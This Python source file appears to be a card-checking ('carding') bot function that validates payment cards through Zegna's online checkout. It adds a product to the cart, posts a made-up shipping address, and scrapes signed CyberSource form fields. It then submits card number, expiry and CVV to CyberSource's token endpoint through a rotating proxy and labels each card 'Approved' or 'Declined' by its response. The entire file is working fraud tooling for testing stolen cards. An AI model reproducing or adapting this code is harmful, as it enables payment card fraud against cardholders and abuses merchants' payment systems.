#import re
#from urllib import response
#import requests
from bs4 import BeautifulSoup
import urllib.parse
import aiohttp
import certifi
import ssl
import random
import asyncio
import platform
from pymysql import NULL

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

async def CMDNasheAuth(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)

    timeout = aiohttp.ClientTimeout(total=25)
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        rand1 = random.randint(100,999)
        rand2 = random.randint(100,999)
        try:
            splitter = cc.split('|')
            ccnum    = splitter[0]
            mes      = splitter[1]
            ano      = splitter[2]
            cvv      = splitter[3] 
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                'Accept': '*/*',
                'Accept-Language': 'es-MX,es;q=0.8,en-ca;q=0.5,en;q=0.3',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://www.zegna.com',
                'Connection': 'keep-alive',
                'Referer': 'https://www.zegna.com/us-en/ready-to-wear/product.dark-grey-cotton-ribbed-mid-calf-socks.10367417/',
            })
            async with session.post('https://www.zegna.com/content/zegna-commerce/zegna-countries/zegna-ca/en/product.addCartEntry.json', proxy=str(proxyrand), timeout=timeout, data='sku=0900601039013&qty=1&_charset_=UTF-8') as resp:
                try :          
                    response = await resp.text()
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 
            
            data = 'firstName=Jian&lastName=Kioep&address=1802%20East%2066th%20Place&addressInfo=&city=Tulsa&region=OK&zipCode=74136&email=ktnndal002%40gmail.com&addressPath=&addressType=filtered&formType=address&elementForm=&streetAddress=1802%20East%2066th%20Place&country=US&pp-mobilePrefix=%2B1&phone=7859097872&phone-number=%2B1-7859097872&default-billing-address=false&default-shipping-address=false&registrationMethod=email'
            async with session.post('https://www.zegna.com/content/zegna-commerce/zegna-countries/zegna-ca/en/checkout/shipping-delivery-payment.newShippingAddress.json', proxy=str(proxyrand), data=data, timeout=timeout) as resp:
                try :
                    response = await resp.text()
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'            
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️' 


            async with session.get('https://www.zegna.com/content/zegna-commerce/zegna-countries/zegna-ca/en/checkout/shipping-delivery-payment/jcr:content/payment.loadPaymentFormData.json?_=1654723395870', proxy=str(proxyrand), timeout=timeout) as resp:
                try :          
                    response = await resp.json()
                    signature = response['hiddenFormFields'][2]['value']
                    uuid      = response['hiddenFormFields'][15]['value']
                    refnumber = response['hiddenFormFields'][18]['value']
                    profileid = response['hiddenFormFields'][23]['value']
                    accesskey = response['hiddenFormFields'][24]['value']
                    datetime  = response['hiddenFormFields'][26]['value']
                    billemail = response['hiddenFormFields'][5]['value']
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'

            listaone = ccnum[0:1]
            if (listaone == '4') :
                tipo = '001'
            elif (listaone == '5') :
                tipo = '002'
            elif (listaone == '6') :
                tipo = '004'
            elif (listaone == '3') :
                tipo = '003'

            data = f'merchant_defined_data2=false&unsigned_field_names=card_type%2Ccard_number%2Ccard_expiry_date%2Ccard_cvn%2Cbill_to_forename%2Cbill_to_surname%2Csignature%2Cmerchant_defined_data1%2Cmerchant_defined_data2%2Cmerchant_defined_data3%2Cskip_decision_manager&bill_to_address_postal_code=74136&signature={signature}&bill_to_address_state=OK&locale=en&bill_to_email=ktnndal002%40gmail.com&skip_decision_manager=true&bill_to_address_country=US&bill_to_phone=%2B1-7859097872&override_custom_receipt_page=https%3A%2F%2Fwww.zegna.com%2Fus-en%2Fcheckout%2Fshipping-delivery-payment%2F_jcr_content%2Fpayment.creditCardManager.json%2F&currency=USD&ship_to_address_country=US&payment_method=card&ship_to_phone=%2B1-7859097872&ship_to_address_state=OK&transaction_uuid={uuid}&transaction_type=create_payment_token&signed_field_names=profile_id%2Caccess_key%2Ctransaction_type%2Cpayment_method%2Creference_number%2Ccurrency%2Clocale%2Ctransaction_uuid%2Csigned_date_time%2Csigned_field_names%2Cunsigned_field_names%2Coverride_custom_receipt_page%2Cship_to_address_city%2Cship_to_address_country%2Cship_to_phone%2Cship_to_to_address_line1%2Cship_to_address_postal_code%2Cship_to_address_state%2Cbill_to_email%2Cbill_to_address_city%2Cbill_to_address_country%2Cbill_to_address_postal_code%2Cbill_to_address_line1%2Cbill_to_phone%2Cbill_to_address_state&reference_number={refnumber}&ship_to_address_postal_code=74136&bill_to_address_line1=1802+East+66th+Place&ship_to_to_address_line1=1802+East+66th+Place&ship_to_address_city=Tulsa&profile_id={profileid}&access_key={accesskey}&bill_to_address_city=Tulsa&signed_date_time={datetime}&bill_to_surname=Jian&bill_to_forename=Lopezka&card_number={ccnum}&card_cvn={cvv}&merchant_defined_data3={random.randint(100000000,999999999)}9321_838a4917-e9d4-40e9-9ebd-0131ff5d090a&card_expiry_date-MONTH={mes}&card_expiry_date-YEAR={ano}&card_expiry_date={mes}-{ano}&merchant_defined_data1=&merchant_defined_data2=false&card_type={tipo}'
            async with session.post('https://secureacceptance.cybersource.com/silent/token/create', proxy=str(proxyrand), data=data, timeout=timeout) as resp:
                try :          
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'            
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️' 


            if int(response.find('id="auth_cv_result"')) > 0 :
                if (int(response.find('Request was processed successfully')) > 0) or (int(response.find('Declined for CVV failure')) > 0) or (int(response.find('AVS check failed')) > 0):
                    auth_avs_code = soup.find("input", {"name": "auth_avs_code"})["value"]
                    auth_cv_result = soup.find("input", {"name": "auth_cv_result"})["value"]
                    await session.close()
                    return "Approved", "Approved", auth_avs_code, auth_cv_result
                else :
                    auth_avs_code = soup.find("input", {"name": "auth_avs_code"})["value"]
                    auth_cv_result = soup.find("input", {"name": "auth_cv_result"})["value"]
                    message = soup.find("input", {"name": "message"})["value"]
                    await session.close()
                    return "Declined", message, auth_avs_code, auth_cv_result
            elif (int(response.find('Declined for CVV failure')) > 0) or (int(response.find('Insufficient funds')) > 0):
                message = soup.find("input", {"name": "message"})["value"]
                await session.close()
                return "ApprovedSinCVV", message
            elif (int(response.find('name="message"')) > 0):
                message = soup.find("input", {"name": "message"})["value"]
                await session.close()
                return "DeclinedSinCVV", message
            else :
                await session.close()
                print(response)
                return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ♻️"
